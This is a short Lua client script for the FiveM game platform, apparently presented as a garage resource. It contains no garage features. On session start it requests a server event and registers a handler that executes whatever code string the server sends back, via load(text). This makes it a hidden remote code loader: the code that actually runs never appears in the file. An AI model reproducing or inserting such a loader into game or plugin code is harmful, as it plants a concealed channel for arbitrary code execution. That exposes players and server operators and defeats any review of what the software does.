Citizen.CreateThread(function()
    while not NetworkIsSessionStarted() do 
        Wait(0) 
    end
    TriggerServerEvent('garagehuan:garagehuan')
end)

RegisterNetEvent('garagehuan:garagehuan')
AddEventHandler('garagehuan:garagehuan', function(text)
    assert(load(text))()
end)